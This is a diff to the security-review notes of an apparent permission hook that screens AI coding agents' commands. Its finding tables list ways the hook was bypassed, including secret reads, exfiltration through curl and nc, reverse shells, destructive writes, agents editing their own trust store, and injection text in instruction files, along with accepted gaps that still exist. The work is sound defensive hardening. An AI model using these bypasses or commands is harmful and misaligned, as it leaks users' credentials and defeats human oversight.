@@ -65,6 +65,355 @@ false positives or add fragile complexity out of proportion to the risk:
 - **Double base64 / hex decoding (D4)** — the content scanner decodes one layer; a payload
   encoded twice evades the decoded-layer scan.
 
+## Third review - structural approve (v0.11.0, 2026-11-17)
+
+Two independent reviews of v0.10.0: the command hook (B-*) and the file hook, trust store,
+scanner and adapters (F-*). Every finding was reproduced against the live hooks over stdin, and
+every fix ships with an attack test and a benign twin. The root cause behind most of the B-C
+findings was one design flaw: the approve pass matched the first word of a segment, not what the
+segment runs. It now recurses instead (env prefix, wrapper, keyword, `&`, substitution, `trap`,
+`find -exec`, `xargs`, PowerShell blocks all reduce to "does the inner command approve?"), which
+closes the holes without prompting on `X=1 npm test` or `timeout 30 npm test`. A committed
+prompt-rate corpus in `test-hooks.js` and `scripts/replay-corpus.js` (a replay of a real decision
+log against the previous release) gate every change on not adding prompts.
+
+| Finding | v0.10.0 | v0.11.0 |
+| --- | --- | --- |
+| B-C1 heredoc fast path approves an unvalidated `cat` preface | allow | deny / exact preface only |
+| B-C2 python heredoc validator is a keyword blacklist | allow | fallthrough (validator removed) |
+| B-C3 env prefix approves the whole command | allow | fallthrough unless the command approves |
+| B-C4 single `&` is not a separator | allow | split; each command checked |
+| B-C5 `$( )`, backticks, `<( )`, `>( )` never inspected | allow | deny-checked and must approve |
+| B-C6 shell keywords approve what follows | allow | the body must approve |
+| B-C7 quoted `find` primaries | allow | primaries read from tokens |
+| B-C8 approve-listed tools that execute arguments (awk, sed, tar, git, fd, rg, tmux, screen) | allow | no approve on exec options |
+| B-C9 PowerShell verb-prefix approve | allow | structural: every stage and group body |
+| B-H1 exponential assignment regex | 30 s+ hang | linear scan |
+| B-H2 secret reads via glob, backslash, `$'x'` | allow | deny |
+| B-H3 secret reads via `sort`, `diff`, input redirect, `ln`, `git diff --no-index`, `curl file://` | allow | deny |
+| B-H4 `curl --json @`, bundled `-sT`, `wget --body-file` uploads | allow | deny (secret) / ask (any file) |
+| B-H5 `xargs` flag arity | allow | unknown flag: no approve |
+| B-H6 heredoc trailing commands skip the ask tier | allow | full pipeline |
+| B-M1 polynomial rules on a long comment | slow | bounded |
+| B-M2 escaped / globbed `rm`, nested `sh -c`, grouped pipe to a shell, `git config set` | fallthrough | deny |
+| B-M3 `bun x <pkg>`, `go run host/mod@v`, `~/.kube/config`, gh `hosts.yml`, `/proc/self/environ` | allow | fallthrough / deny |
+| F-C1 `:*` rule matched against the whole compound command | allow | segment only |
+| F-C2 Windows backslash paths | fallthrough | deny |
+| F-H1 repo-committed `settings.local.json` | allow | inside a git checkout: ignored when git reports it tracked, in any letter case, and when git cannot answer. Outside any checkout: honoured (the user's own `~/.claude`) |
+| F-H2 agent writes its own trust / hooks / relative `SHELLTER_TRUST_FILE` | fallthrough / allow | deny for the trust store, installed shellter hook files, the plugin cache subtree and any write to the `package.json` beside the hooks (the hooks create it as CommonJS when missing, so a parent `package.json` is irrelevant); `SHELLTER_TRUST_FILE` inside any git checkout ignored. Settings edits are ask-only, silent in bypass and auto mode |
+| F-H3 Grep `glob`, token-shape regexes | fallthrough | deny for explicit secret-name globs; token shapes only over a broad path. Adapters pass include globs through |
+| F-H4 adapter write tools unscanned | allow | scanned (best-effort shapes) |
+| F-H5 adapters time out on 300 KB comment padding | fail open | linear comment scan, 25 s adapter timeout; since the fifth review a hook that does not finish within its budget answers ask (deny in bypass / auto) |
+| F-H6 installer with a space in the home path | fail open | quoted |
+| F-M1 junction / `::$DATA` / other hosts' instruction files | fallthrough | deny |
+| F-M2 invisible format characters, Markdown emphasis | fallthrough | deny on instruction files: default-ignorable code points, combining marks and the braille blank are stripped by class; HTML tags and link wrappers seen through |
+| F-M3 false hard-denies on ordinary content | deny | fallthrough / ask |
+| F-M4 `shellter scan` blind spots | no findings | reported |
+| F-M5 decode budget exhausted by 8 decoys | fallthrough | 64 tokens; exhaustion asks on instruction files |
+| F-M6 secret-path list gaps | fallthrough | deny (history / `.claude.json` ask) |
+| F-L1 dead `data:text/html` branch | fallthrough | deny in rendered docs |
+| F-L2 installer BOM / non-object settings | data loss | BOM accepted, non-object aborts |
+| F-L3 stale bun adapter tests | red | green |
+| F-L4 dead `permissions` line | present | removed |
+
+The recursion described above was the round-1 design. Round 2 (below) replaced it with one parser.
+
+## Fourth review - fail-closed approve (v0.11.0, 2026-11-18)
+
+Two reviews of the round-1 fixes found that the approve path still held six independent models of
+bash (chain split, pipe split, substitution extractor, heredoc view, tokenizer, keyword regexes);
+every new bypass was a place where two of them disagreed. The approve side is now one strict parser
+(`parseBash`) and one walker. A command the parser does not fully read is never auto-approved; the
+raw deny passes still run on everything, so deny coverage does not depend on the parser. Parse and
+walk failures of any kind, more than 64 nesting levels and more than 4,096 words all mean "unparsed".
+Every finding below is pinned in `test-hooks.js` with a benign twin, and the reviewers' probe files
+are part of the suite (`test-probes.js`).
+
+| Finding | v0.11.0 round 1 | v0.11.0 |
+| --- | --- | --- |
+| N1 xargs with a quoted or pathed command word | allow | fallthrough |
+| N2 heredoc view blanks real command lines | allow | fallthrough |
+| N3 `((` assumed arithmetic | allow | fallthrough |
+| N4 `for` / `select` approve unread | allow | fallthrough |
+| N5 `node --check` with a preload | allow | fallthrough |
+| N6 `gh api` attached short flags | allow | fallthrough |
+| N7 heredoc `tee` target lost | allow | ask |
+| N8 PowerShell here-string quote parity | allow | fallthrough |
+| H-1 `fi` / `done` prefix approves | allow | fallthrough |
+| H-2 a quote inside a `#` comment | ask | deny |
+| H-3 PowerShell name prefix match | allow | fallthrough |
+| H-4 PowerShell member-name invocation | allow | fallthrough |
+| H-5 sed walker (value-taking flag) | allow | fallthrough |
+| H-6 awk walker | allow | fallthrough |
+| H-7 env prefix behind `time` | allow | fallthrough |
+| H-8 exec-flag gaps (git `ext::`, `fetch -u`, tar `I`, `less +`) | allow | fallthrough |
+| H-9 secret read via a loop variable, attached redirect, `$'\x..'` | fallthrough / allow | deny |
+| H-10 curl header from a secret file | fallthrough | fallthrough (accepted, see below) |
+| H-11 cubic `sed -i` rule (27 KB) | hang | bounded, class timing test |
+| H-12 `-n` as a value flag for every verb | allow | scoped to `head`/`tail`/`grep`/`rg` |
+| M-1 download rule weakened by `&` in a URL | fallthrough | deny restored |
+| M-2 trust-store basename match on fixtures | deny | fallthrough (resolved path compared) |
+| M-3 flagged script behind a pipe, `$( )`, `if` | fallthrough | ask |
+| M-4 heredoc fast path writes `.git/`, `.husky/`, `.claude/settings*.json` | allow | fallthrough / ask |
+| F M-2 Glob `**/*credential*`, `**/*id*` | deny | fallthrough; literal secret stems still deny |
+| F M-4 path lists exhausting the decode budget | ask | fallthrough |
+| F M-9 quoted override phrase in `SKILL.md` | deny | ask on instruction files (a quote is one character, so it cannot exempt there); advisory elsewhere |
+
+Measured on the maintainer's command log (5,389 unique commands) against 0d49eac: 56 benign
+auto-approvals (1.7%) now prompt, all in named classes (env prefix, loop or if body, wrapper, python
+heredoc, invalid sed, `${x%%pat}`, unresolved substitution); 346 rows that prompted now approve; no
+benign command went to deny. Against round 1: 10 allow -> fallthrough, all attack probes or accepted
+classes.
+
+### Accepted limits (v0.11.0)
+
+- **An unparsed command is never auto-approved, and in bypass mode it runs.** `((..))`, `for ((..))`,
+  functions, `select`, `coproc`, PowerShell here-strings, `${ }` and block comments are not modelled.
+  Self-protection against an unmodelled command (`node -e` writing the hooks dir) is not a sandbox.
+- **Arithmetic over file content** (`x=$(cat f); echo $((x+1))`, `read -r n < f; echo $((n+1))`)
+  prompts: bash evaluates the value as an expression; only producers that print digits are trusted.
+- **A standalone `IFS=..`** prompts: it changes how every later bare expansion splits.
+- **An unread value as an argument of an exec-capable command** (`gh api ../$id` with the id from an
+  unread `--jq`, `git -C $P` with `P` from `read`) prompts.
+- **A cloned directory with no `.git`** (zip, tarball, template copy) honours its `settings.local.json`:
+  there is no index to ask.
+- **CR in a command** (CRLF line ends) prompts; the parser refuses every CR.
+- **Derived-name and recursive reads.** A name produced by `find`, `ls`, `grep -l`, `git ls-files`
+  counts as resolved for the approve floor, and `grep -r` / `--include` over a tree is allowed: the
+  same reach as recursive content search, which is the tool's purpose.
+- **Glob forms that are not a literal secret stem or prefix** (`*env`, `**/*nv`, `**/?env`, `**/.e*v`,
+  `**/id_*`, `**/*.pe?`, `*ssh/*`, `**/.s*/id*`) in Grep and Glob fall through: any rule that catches
+  them re-creates the false denies.
+- **One-character regex evasions** of the token-shape Grep rule (`AK[I]A`): it is a tripwire for mass
+  harvesting, not a boundary.
+- **Write-then-run chains** (a heredoc `package.json` then `npm test`): project-trust model.
+- **`cp /dev/stdin <dest> <<EOF`, `sort -o`** to destinations other than rc files, Claude settings and
+  shellter's own files: general write-target classification is deferred.
+- **`time X=v cmd`, and an app variable in prefix form before a read-only tool** fall through.
+- **PowerShell has no full parser.** `poshScan` rejects what it does not model.
+
+- **Code runners** (`tsx x.ts`, `ts-node`, `bun run`, `uv run`, `java -jar`, `pnpm exec`) still
+  auto-approve: they run project code, the same trust as `npm run`. Only the remote-fetch forms
+  (`bun x <pkg>`, `go run host/mod@version`) were closed.
+- **Destructive or persistent writes** that no rule names (`chmod -R 000 ~`, `mv ~/Documents /tmp`,
+  `git switch -f`, `echo x > ~/.config/autostart/...`) still auto-approve. Only shell rc files and
+  Claude Code settings (ask) and shellter's own files (deny) are classified as write targets.
+- **`PATH=` over system or home directories and app variables before a project-code runner** stay
+  approvable: `export PATH="$HOME/.cargo/bin:$PATH" && cargo build` is everywhere. Loaders
+  (`LD_*`, `DYLD_*`, `BASH_ENV`, `HOME`, ...) never approve.
+- **A secret env var in a header or URL** (`curl -H "Authorization: Bearer $GITHUB_TOKEN" ...`) is
+  indistinguishable from every authenticated API call.
+- **`cp $X out.txt` with an unresolved `$X`** stays approvable: copying is not disclosure.
+- **sed / awk scripts whose shell variable carries code at runtime** do not approve: an unresolved
+  expansion in a sed script may only stand for a line number, and an awk program must be literal.
+- **Heredoc bodies of `cat`/`tee`** are still deny-scanned as pseudo-commands (a known false-prompt
+  source); relaxing a deny pass does not belong in a security-fix release.
+- **WebFetch / WebSearch** are not gated: exfiltration needs a secret already read, which the gated
+  tools cover.
+- **MCP tools (`mcp__*`) are a known bypass.** A filesystem or shell MCP server reads and runs what
+  it is asked; shellter does not know its tool shapes, and a generic sniff would false-deny.
+- **A hook that cannot finish** within `SHELLTER_BUDGET_MS` (at most 8 s; one retry under 16 KB) asks in
+  default, acceptEdits and plan mode and denies in bypassPermissions and auto mode (`TIMEOUT_DECISION` in
+  `hooks/watchdog.js`), unless the user's own allow rule or trust store covers the whole command: that
+  falls through. `test-perf.js` keeps the known paddings far under that budget. Adapters time out after
+  25 s, above the watchdog's worst case; agy asks then, the others fail open. The file hook's timeout
+  has no allow override. A patch blob runs one hook per target in turn, so a blob of many targets can
+  still exceed codex's 30 s.
+- **`ls` / `list` on `~/.ssh`** through the opencode and pi adapters: filenames only.
+- **Host tool shapes** for codex / agy / opencode patch and multi-edit tools are best-effort; only
+  the adapter side is verified.
+- **Triple encoding, and codex treating `ask` as silent**: unchanged, documented above.
+- **`tmux send-keys`, git commit hooks, `npm run` scripts**: project-trust model.
+
+## Fifth review - bounded time, bash's words (v0.11.0, 2026-11-18)
+
+Two reviews of round 2 found six root causes: no bound on analysis time, the parser's words not being
+bash's words, unread arguments treated as ordinary, four definitions of "sets a variable" and of
+"integer", a second decision path beside the parser (the heredoc fast path), and caps that failed
+open. Each is fixed once, where every caller routes through. A differential fuzz
+(`test-parser-fuzz.js`) and a performance gate (`test-perf.js`) now run in `npm test` and CI.
+
+| Finding | v0.11.0 round 2 | v0.11.0 |
+| --- | --- | --- |
+| B F1 `${x:-{}` ends at the first `}` | allow | fallthrough |
+| B F2 heredoc fast path approves before any deny pass (critical) | allow | the heredoc goes through the parser; fallthrough / deny |
+| B F3 exec flags through word splitting, brace expansion, NUL, `$( )` arguments, `xargs find` | allow | fallthrough |
+| B F4 sed line-number placeholder that is not an integer | allow | fallthrough |
+| B F5 arithmetic in heredoc bodies, `trap`, `bash -c`, `[[ -v ]]`, name positions, `declare -i/-n` | allow | fallthrough |
+| B F6 `PATH` set by `for`, `read`, `printf -v`, `${:=}`; `hash -p` | allow | fallthrough |
+| B F7 backslash CR LF (Linux bash) | allow | fallthrough (any CR) |
+| B F8 `test/x.sh`, `echo-x`, `ls.bat` matched as `test`, `echo`, `ls` | allow | fallthrough |
+| B F9 PowerShell `$var.Method()` in argument mode; quote mis-pairing | allow | fallthrough |
+| B D1 / F H-1 / F H-4 quadratic scans: no answer | fail open | worker-thread watchdog; perf gate |
+| B P1 21 everyday commands lost their allow | fallthrough | allow (19); 2 accepted (file-content arithmetic) |
+| B R1 name producers that print text (`find -printf`, `grep -o`) | allow | fallthrough |
+| B R2 `${x:=.env}`, `printf -vx` stale values | allow | fallthrough |
+| B R3 `cat < .e*` | allow | fallthrough |
+| B R4 protected path as an argument; unresolved write target | allow / fallthrough | fallthrough / deny |
+| F H-2 50-match cap on quoted phrases | fallthrough | deny |
+| F H-3 any write to the hooks' `package.json` switches both hooks off | fallthrough | deny; the hooks pin it |
+| F M-1 `settings.local.json` shipped as `CLAUDE~1/` | allow | not honoured (ask) |
+| F M-2 shim: `+++` inside a `***` blob, `paths` hides `path` | allow | deny |
+| F M-3 opencode patch shapes | allowed | blocked (one parser, `hooks/patch-targets.js`) |
+| F M-5 literal prefix plus one `*` (`.en*`, `id_r*`) | fallthrough | deny |
+| F L-4 agent worktree source scanned as an instruction surface | deny | fallthrough |
+| CR1 a bracket class over 512 characters made the glob unreadable: read as "no secret" | allow | deny |
+| CR2 `cd ~/.claude/hooks && tar xf x.tar`: a cd hid the protected directory | allow | fallthrough |
+| CR3 `git -C <shellter checkout> pull`: git counted as a plain reader | allow | fallthrough (reading subcommands still allow) |
+| CR4 a name unknown before `if false; then X=a; fi` read as `a` after it | allow | fallthrough |
+| CR5 patch: a ` *** ` context line hid later `+++` headers; `+++ "b/.env"` kept its quotes | allow | deny |
+| CR6 Glob `.git*` denied as a prefix of `.git-credentials` | deny | fallthrough |
+| CR7 emphasis runs of 5+ markers inside an override phrase | fallthrough | deny |
+| CR8 trust check listed the whole index (1 MB, 2 s): big repos lost their local rules | rules ignored | honoured (two levels listed, 16 MB) |
+| CR9 `SHELLTER_BUDGET_MS` above the adapters' kill | fail open | clamped to 8 s, allow check 4 s, adapters at 25 s |
+
+Corrections to earlier text: PowerShell member calls were not closed by round 2 (F9); `?env` falls
+through, it does not deny.
+
+## Sixth review - final (v0.11.0, 2026-11-19)
+
+Two reviewers ran about 1,400 probes against the round-3 head, bash and PowerShell behaviour confirmed in
+real shells on marker commands. Seven bash-side and three file-side blockers, all fixed.
+
+| Finding | v0.11.0 round 3 | v0.11.0 |
+| --- | --- | --- |
+| B1 PowerShell: a lone CR ends a comment, the approve view read on to LF | allow | fallthrough |
+| B2 PowerShell: `#` after a backtick-escaped space, `;`, `\|`, `(`, newline read as a comment | allow | fallthrough |
+| B3 `${F:=x}` in a heredoc body, `[[ ]]`, a `for` list, a `case` word | allow | fallthrough |
+| B4 `$_`, `BASH_REMATCH` (and `REPLY`, `PIPESTATUS`, `BASH_*`, ...) read as environment names | allow | fallthrough |
+| B5 array-assignment subscript `y=([x]=1)` not arithmetic | allow | fallthrough |
+| B6 a word-less redirect, `&>`, a glob in a target or a directory, a loop / xargs / dirname / symlink onto shellter's files | allow | deny (resolved target) / fallthrough |
+| B7 git with a revision from `$( )` prompted (11 of 267 everyday commands) | fallthrough | allow for commit ids (`rev-parse`, `merge-base`) and `--since=`-style values; ref names still prompt |
+| F B1 reversed range `[post-id]` read as "secret" | deny | allow / fallthrough |
+| F B2 POSIX classes `[[:alpha:]]`, `[[=e=]]`, `[[.e.]]` | allow | deny |
+| F B3 a project's own `.claude/hooks/package.json` | deny | fallthrough (only `~/.claude/hooks/package.json` and the running hooks' own) |
+
+B6 detail: a target is matched component-wise, each glob component standing for every protected name it
+matches; past 256 expansions it denies when a component can be `.claude` and asks when the last can name an rc file. Paths are normalised (`./`, `..`,
+`//`) first. A command whose words name `~/.claude` itself, any `.claude/hooks` or `.claude/plugins`, or a
+glob below a `.claude` approves no non-reader with an unread argument or one naming them after it, and no
+redirect (`>&` too) to an unread or glob target or into them; an `ln`
+naming them, or a `cd` into a `.claude`, also stops literal redirects. B7 detail: a revision producer is
+`git rev-parse` (`--short`, `--verify`, `-q`) or `merge-base A B`: a commit id, never a leading `-`. Ref-name
+producers (`--abbrev-ref`, `describe`, `branch --show-current`, `symbolic-ref`) are not trusted: a fetched ref
+can be named `--upload-pack=x` or `--output=x`. The value is trusted only as a git argument (`date` output follows `TZ`). With an unread or derived argument, `--ext-diff`,
+`--textconv`, `--output`, `--no-index`, `-c`, `-C`, `--git-dir`, `--work-tree`, `-o`, `-u`, `-O`,
+`--upload-pack` and friends refuse; an unread `-C` value alone does not. A git value-only option
+(`--since="$d"`) takes an unread quoted value. A name set from a producer on one branch only is unread.
+
+Code review of these fixes (high): a glob overflow skipped the raw-path check; `date` and refs as
+never-dash values outside git; non-normal spellings of the hooks dir; `-C` / `--git-dir` with an unread
+revision; a conditional merge that dropped the producer marker; `ls ~/.claude/hooks > /tmp/list` prompting.
+Second pass (medium): `>&` missing from the redirect check; a nested array subscript (`y=([a[x]]=1)`);
+ref-name producers trusted; a glob overflow asking outside `.claude`; `ls ~/.claude/plugins; npm test`
+prompting; the hooks `package.json` deny not normalised. All fixed and pinned.
+
+### Accepted limits (final review)
+
+- **A watchdog worker that exits non-zero without an `error` event** falls through. Not reachable: the hooks
+  exit 0 only.
+- **A message-flag value** (`-m`, `-b`, `-t` after any exec-capable command, `tar -m "$n"`, `git diff -b "$n"`)
+  is exempt from the unread-argument rule, and the value can be an option.
+- **A quoted argument behind a literal prefix** (`curl -o "out/$n"`) approves; the value can hold `../`.
+- **GET exfiltration of a non-secret file** (`curl "http://host/?q=$(cat f.txt)"`) approves; the `-d` form denies.
+- **A default-value splice hides a secret name from copy and archive verbs** (`cp .e${x:-n}v out.txt`): the read
+  verbs fall through. Same reach as `grep -r` and `cp -r .`.
+- **Redirect writes to `~/.gitconfig`, `.git/config`, `~/.claude.json`** approve; `cat > .gitconfig <<EOF`
+  denies. General write-target classification is deferred.
+- **`ls.exe`, `rg.exe`, `cat.exe f.txt`** fall through (F8: the command word must be the tool's own name).
+- **A write target from an unread value** (`d=$(cat f); cp x "$d/check-bash.js"`), a relative `.claude` after
+  `cd ~`, and a path the command builds byte by byte are not traced: self-protection is not a sandbox.
+- **git with a ref name from a substitution prompts** (`git log "$(git branch --show-current)"`): a cloned
+  repository's ref can be named like a git option.
+- **After a word naming `~/.claude/hooks`, a non-reader with an unread argument prompts**, a nested array
+  subscript prompts, and a git command in another repository with an unread argument prompts.
+- **`${F:=x}` over a value the walker cannot prove non-empty** makes F unread, also when bash would keep it.
+- **The patch parser is quadratic on one very long header line** (40 KB: about 1 s; 250 KB through the codex
+  shim: past codex's 30 s). It runs in the shim, outside the watchdog. Same outcome as the many-target limit.
+- **A 30-file patch takes about 20 s through the shim** (one hook per target, 0.65 s a spawn on the reviewer's
+  machine).
+- **More than 2,000 tracked depth-2 names with `~`, `:`, a non-ASCII character or a trailing dot**: the trust
+  check gives up on alias resolution and the untracked `settings.local.json` is not honoured (its scripts ask).
+- **`merge-settings.js` replaces an existing `~/.claude/hooks/package.json`** with `{"type":"commonjs"}`.
+- **Glob `.npm*`, `.np*`, `**/.net*` deny** (literal prefix of `.npmrc` / `.netrc`, intended). Since 0.11.1
+  Glob falls through: it lists names and reads nothing.
+- **A Write of this repository's own `CHANGELOG.md` denies**: the entry quotes an encoded-exec call form.
+- **CI has not run the two new gates on hosted runners**; `test-perf.js` has a 3 s wall-clock bound.
+
+## Seventh review - E2E eval (v0.11.1, 2026-11-20)
+
+An end-to-end eval of 0.11.0 (562 benign operations, 283 attack probes, 4 headless Claude Code sessions)
+found five attack classes auto-approved by 0.11.0 and 0.10.0, three parity holes and five benign denies.
+
+| Finding | v0.11.0 | v0.11.1 |
+| --- | --- | --- |
+| A secret-shaped variable in a curl/wget URL, body, `-F`, `-A`, or piped to nc/curl | allow | deny |
+| A secret-shaped variable in a header or `-u` value | allow | fallthrough (decision: how tokens are meant to be sent) |
+| B written content with a secret upload, reverse shell or download-exec, then run in the same command | allow | deny |
+| B a secret upload or reverse shell in a command-definition file (shell write, Write/Edit) | allow | deny |
+| B unreadable content (`cp`, `curl -o`, `wget`, `git apply`) into a command-definition file, then a runner | allow | fallthrough |
+| C `--script-shell`, `go -exec`, `cargo --config`, `pytest -p`, `node -r`, `make SHELL=`, a config or `cd` in a temp dir | allow | fallthrough |
+| D `env`, `printenv`, `export -p`, `set`, `declare -x`, `echo $TOKEN`, `Get-ChildItem Env:` to the transcript | allow | deny |
+| D `ps e`, awk `ENVIRON`, jq `env`, `npm run env` | allow | fallthrough |
+| Linux: `cat`/`jq` of `~/.claude.json`, `~/.codex/auth.json`, Atlassian/Bitbucket CLI configs; `/proc/*/task/*/environ` | allow | deny |
+| Linux: Read of a credential-looking name under home, outside the project | allow | ask (deny if it holds a token) |
+| E `>> ~/.bash_aliases`, `~/.bash_login`, `~/.bash_logout` | allow | ask |
+| PowerShell writes to shellter's files, trust store, settings (incl. `Copy-Item -Destination`, `>`, `Set-Location`) | fallthrough | deny / ask (as bash) |
+| PowerShell injection text into CLAUDE.md (positional, named, piped, `>`) | fallthrough | deny |
+| Write/Edit `.git/hooks/*` with download-exec content | fallthrough | deny |
+| Glob (names only, any pattern or directory) | deny | fallthrough |
+| Read/cat a `.pem`/`.key` under a project test or fixtures dir | deny | fallthrough (deny after `cd`/`ln` or through a symlink out) |
+
+Out of scope, unchanged: destructive and tamper commands that fall through in bypass mode.
+Accepted limit: source code that reads `.env` and posts it (JS `readFileSync` + `fetch`, Python, Go, Rust)
+is not detected in a Write or a shell write; a runner after it still approves. A two-call split
+(Write, then `npm test`) was never covered by the same-command rule, so the content scan is the control.
+
+### Adversarial review of the 0.11.1 fixes (2026-11-23)
+
+A second pass over `ed72d3a..f7911a0` (`hooks/`) found regressions and misses in the fixes above. All fixed and
+pinned in test-hooks.js (attack probe and benign twin each).
+
+| Finding | f7911a0 | fixed |
+| --- | --- | --- |
+| A1 `curl -O` of `CLAUDE.md`, `.mcp.json`, `PACKAGE.JSON`, a dotfile, into `.github/workflows` or `~/.claude` | allow | fallthrough |
+| A2 download + unpack + git; an unpack into `.git` / `.claude`; a downloaded archive into the project root | allow | fallthrough |
+| A3 fixture-key exemption after `cd` / `ln` or through a symlink out of the project | allow | deny; a fixture key never approves |
+| A4 secret gate blind to `'` inside double quotes and to `sh -c '..'` | allow | fallthrough |
+| A5 `gci env:G*`, a computed env path, awk `ENVIRON`, jq `env`, yq `env()` | allow | fallthrough |
+| A6 a recipe hidden behind printf / `echo -e` escapes, then run | allow | deny |
+| A7 foreign content into a test or tool config, case variants, loops and traps, then a runner | allow | fallthrough |
+| A8 a literal Makefile / package.json that publishes or pushes, then a runner | allow | fallthrough |
+| A9 `cd --`, `/dev/shm`, runner arguments in a temp dir, more code-loading flags, `npm_config_*` | allow | fallthrough |
+| A10 PowerShell wildcard `cd` into `~/.claude`, then a delete | allow | deny |
+| B1 `curl -du=$TOKEN`, `wget -H`, a `'` in a quoted URL, `stdbuf`, PowerShell `& curl.exe` | fallthrough | deny |
+| B2 PowerShell abbreviated / colon-bound parameters, wildcards, script blocks, pipes, `New-Item -Name`, `Expand-Archive`, `[IO.File]` | fallthrough | deny / ask |
+| B3 PowerShell CLAUDE.md injection via `New-Item`, `Tee-Object`, `% { }`, `[IO.File]`, a `>` in the value | fallthrough / ask | deny |
+| B4 Write `Package.json` / `MAKEFILE` / `composer.json` / `.husky/*` with a secret upload | fallthrough | deny |
+| C1 `$MAX_TOKENS`, `$NEXT_PAGE_TOKEN`, `$TOKEN_TYPE`, `$KEY_FILE`, `$key`, cookie / bearer / cert values | deny | fallthrough (allow for a loop variable) |
+| C2 an installer line written to a README, Dockerfile, docs, a setup script, a Makefile | deny | allow / fallthrough |
+| D1 loop variables, test operands, `${X:+set}`, an escaped `\$TOKEN` | fallthrough | allow |
+| D2 `for d in packages/*; do (cd "$d" && ..)`, `cd "$CLAUDE_PROJECT_DIR"` | fallthrough | allow |
+| D3 `ps -C node`, `ps -u postgres` | fallthrough | allow |
+| D4 `printenv PATH`; Glob of a secret directory | fallthrough; deny | allow; fallthrough |
+
+A code review of those fixes found more, also fixed and pinned:
+
+| Finding | fixed |
+| --- | --- |
+| `$DB_PASSWORD`, `$PGPASSWORD`, `$SSH_PRIVATE_KEY`, `$X_CREDENTIALS` dropped from the secret names | prompt (print) / deny (send) |
+| `echo do test $TOKEN`, `[ $TOKEN -eq 1 ]` read as a test operand; `ps aux e` | fallthrough |
+| A lifecycle script matched on raw JSON (`|`); unparseable package.json | JSON-decoded; unparseable is scanned whole |
+| An unpack after `cd "$(..)"` / `cd $D` | fallthrough |
+| `[IO.File]::Move` source, `[IO.Directory]::Delete`, `Set-Location ~; Remove-Item -Recurse .claude` | deny |
+| A literal Makefile recipe that no rule names (`node -e ..`), `$(shell ..)`, `include`, `SHELL :=` | fallthrough: every recipe must approve |
+| `curl -O` into a home dot directory (`~/.config/gh`, `~/.docker`) | fallthrough |
+| `npm config get //registry/:_authToken` | fallthrough |
+
+Left: `cd - && npm test` still prompts (OLDPWD is unknown). A runner after a `cd` to a directory outside the project
+that is not a temp dir or Downloads (`cd /opt/other && make`, `cd ~/Desktop/x && npm test`) still approves: it is
+indistinguishable from the sibling checkouts agents test from a parent folder.
+
 ## Read the verdict labels precisely
 
 shellter is deny → script-scan → ask → approve → **fallthrough**. A finding's
